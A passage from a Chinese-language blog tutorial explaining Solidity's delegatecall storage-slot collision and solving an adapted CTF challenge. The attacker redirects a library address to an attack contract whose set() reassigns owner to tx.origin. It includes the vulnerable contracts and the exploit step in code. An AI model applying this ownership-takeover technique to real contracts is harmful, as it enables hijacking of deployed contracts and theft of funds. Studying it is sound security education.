wrong");`。那我们能否在这个地方做手脚呢？
**（此处是重点）** 在子合约中我们定义了两个uint的变量`start 与
calculatedNumber`。而在Solidity存储机制中，他们两个被分别存储在`slot[0]与slot[1]`这两个位置。（代表以太坊虚拟机的两个空间）
类似的，在`Mastercontract`合约中，`addr
与calculatedNumber`也被存储在`slot[0]与slot[1]`这两个位置。而根据我们上面的测试内容，delegatecall保留了合约的上下文，运行环境其实为本合约。这意味着通过delegatecall的代码将对主调用合约的状态（如存储）产生作用。
也就是说，我使用`delegatecall
()`函数后由于是在主合约的上下文中，所以子合约将去寻找start，而在以太坊机制中，我们并不是通过名字来进行值的获取，而且根据位置了寻找。即库合约中的start的存储位置为slot[0]，那么当使用delegatecall时，就是在主调用合约的slot[0]位置去找，但是在主调用合约中slot[0]位置的值为`addr`。也就是说，我们通过远程调用而改变了主函数中变量的值。
下面我们看具体的代码实验。
首先我们部署子合约：
之后我们传入子合约地址并部署master合约，之后得到
之后传递aaa的值为55555：
再次点击aaa后，我们查看更新后的值：
发现我们的合约`fibonacciLibrary1`的值被更改了。
我们将代码放于此：
    pragma solidity ^0.4.23;
    contract Subcontract {
        uint public calculatedNumber;
        // uint public start = 99;
        // function setStart(uint _start) public {
        //     start = _start;
        // }
        function setfun(uint n) public {
            calculatedNumber =  n;
        }
    }
    contract Mastercontract {
        // uint public withdrawalCounter = 20;
        address public fibonacciLibrary1;
        address public fibonacciLibrary;
        bytes4 constant fibSig = bytes4(keccak256("setfun(uint256)"));
        constructor(address _fibonacciLibrary) public {
            fibonacciLibrary = _fibonacciLibrary;
        }
        function aaa(uint Counter) public {
            fibonacciLibrary.delegatecall(fibSig,Counter);
        }
    }
我们发现我们并没有能够更改`fibonacciLibrary1`参数的入口，但是它确实被更改了。也就意味着我们使用`delegatecall`函数成功了。
#### 2 合约CTF题目分析
下面，我们看一道改编后的ctf题目。
在测试环境中，我们需要用到三个合约地址：
这三个合约地址分别部署子合约、父合约以及攻击合约。
而下面我们看一下题目。
    pragma solidity ^0.4.23;
    import "github.com/Arachnid/solidity-stringutils/strings.sol";
    contract Ttest {
      address public addr1;
      address public addr2;
      address public owner; 
      using strings for *;
      bytes4 constant setTimeSignature = bytes4(keccak256("set(uint256)"));
      constructor(address _a, address _b) public {
        addr1 = _a; 
        addr2 = _b; 
        owner = msg.sender;
      }
      function First(uint _timeStamp) public {
        addr1.delegatecall(setTimeSignature, _timeStamp);
      }
      function Second(uint _timeStamp) public {
        addr2.delegatecall(setTimeSignature, _timeStamp);
      }
      function attack(string name) public returns(string){
        require (owner == msg.sender);
        string memory c = "Congratulations  attacker !!";
        return c.toSlice().concat(name.toSlice());
      }
    }
    contract Library {
      uint first;  
      function set(uint _time) public {
        first = _time;
      }
    }
主合约中共有三个函数：`First Second
attack`。而前两个函数用于调用子合约中的set函数。我们在`attack()`函数中看到，在内部需要require，即在执行此函数的过程中需要将我们的owner身份验证为调用者。
**（也就是说我攻击者需要将owner改成自己的地址才能攻击）**
所以我们根据上面提及的内容，进行分析。我们知道在`First Second`函数中存在`delegatecall
()`，而我们知道这个函数是在运行函数方的上下文中进行的。所以我们根据上文提及的存储漏洞来进行合约攻击。
首先部署好合约：
这里分别使用第一个地址与第二个地址部署。
之后我们使用第三个地址部署攻击合约：
此时我们能够看到目前`addr1与addr2`变量对应的地址为子合约那个部分的地址。也就是说我现在调用函数会执行自合约部分的set函数。
之后我使用存储漏洞修改掉地址一。此时我们将attack部署在地址三上。然后传入attack合约地址于First函数中。
运行后查看得到：
此时，我们`addr1`的地址已经变成了部署`attack`的地方，也就是说此时倘若我运行`First()`函数，那么我们就会调用`attack`合约中的`set()`函数。而我们具体看一下set函数的内容：
    function set (uint _time) public {
          owner = tx.origin;
      }
我们任意的传入参数，之后就会将`owner`更改为合约所有者——即attacker的地址。
此时我们调用了`First`函数，之后我们再看`owner`的变化。
它从`0x14.......`变成了`0x4B......`。也就是说它变成了我们攻击者的owner地址。
此时我们就可以调用`Ttest`合约中的`attack()`函数（因为已经绕过了owner）。得到：
至此，我们的攻击成功。
### 四、参考链接
  * 
  * 
  * 
**本稿为原创稿件，转载请标明出处。谢谢。**